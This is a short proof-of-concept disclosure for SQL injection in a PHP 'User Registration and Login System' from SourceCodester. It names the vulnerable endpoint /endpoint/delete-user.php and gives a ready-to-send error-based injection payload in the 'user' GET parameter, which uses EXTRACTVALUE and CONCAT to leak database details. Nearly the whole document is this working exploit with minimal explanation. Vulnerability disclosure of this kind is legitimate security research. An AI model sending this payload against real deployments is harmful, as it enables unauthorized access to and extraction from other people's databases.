# user-registration-and-login-system-SQLi-PoC
SQL injection vulnerability PoC for (User Registration and Login System by rems)

Author : Abdelhamid Aghamir

vendors: https://www.sourcecodester.com/php/16890/user-registration-and-login-system-using-php-source-code.html

Vulnerability File: /endpoint/delete-user.php

[+] PoC:
Send a get request to the endpoint with the given payload to retrieve the database name ! 

/endpoint/delete-user.php?user=1' AND EXTRACTVALUE(4432,CONCAT(0x5c,0x716b767671,(SELECT (CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END)),0x7171787171))-- XXX
